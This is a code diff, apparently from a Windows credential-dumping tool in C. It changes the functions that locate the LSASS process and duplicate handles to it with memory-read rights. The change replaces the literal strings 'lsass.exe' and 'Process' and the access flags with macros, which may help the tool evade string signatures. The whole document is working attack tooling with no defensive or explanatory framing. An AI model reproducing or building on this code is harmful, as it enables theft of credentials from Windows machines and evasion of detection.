@@ -4,7 +4,7 @@
 BOOL is_lsass(HANDLE hProcess)
 {
     // if the process has 'lsass.exe' loaded, then we found LSASS
-    wchar_t* module_name[] = { L"lsass.exe" };
+    wchar_t* module_name[] = { LSASS_EXE };
     Pmodule_info module_list = find_modules(
         hProcess,
         module_name,
@@ -27,7 +27,7 @@ HANDLE find_lsass(void)
     {
         NTSTATUS status = NtGetNextProcess(
             hProcess,
-            PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
+            LSASS_PERMISSIONS,
             0,
             0,
             &hProcess
@@ -315,7 +315,7 @@ BOOL is_process_handle(
 #endif
         return FALSE;
     }
-    if (!_wcsicmp(ObjectInformation->TypeName.Buffer, L"Process"))
+    if (!_wcsicmp(ObjectInformation->TypeName.Buffer, PROCESS_TYPE))
         is_process = TRUE;
     intFree(ObjectInformation); ObjectInformation = NULL;
     return is_process;
@@ -363,9 +363,8 @@ HANDLE duplicate_lsass_handle(
             if (handleInfo->ProcessId != ProcessId)
                 continue;
 
-            // make sure the handle has PROCESS_QUERY_INFORMATION and PROCESS_VM_READ
-            if ((handleInfo->GrantedAccess & PROCESS_QUERY_INFORMATION) == 0 ||
-                (handleInfo->GrantedAccess & PROCESS_VM_READ) == 0)
+            // make sure the handle has the permissions we need
+            if ((handleInfo->GrantedAccess & (LSASS_PERMISSIONS)) != (LSASS_PERMISSIONS))
                 continue;
 
             if (!hProcess)
@@ -387,7 +386,7 @@ HANDLE duplicate_lsass_handle(
                 (HANDLE)(DWORD_PTR)handleInfo->Handle,
                 NtCurrentProcess(),
                 &hDuped,
-                PROCESS_QUERY_INFORMATION|PROCESS_VM_READ,
+                LSASS_PERMISSIONS,
                 0,
                 0
             );
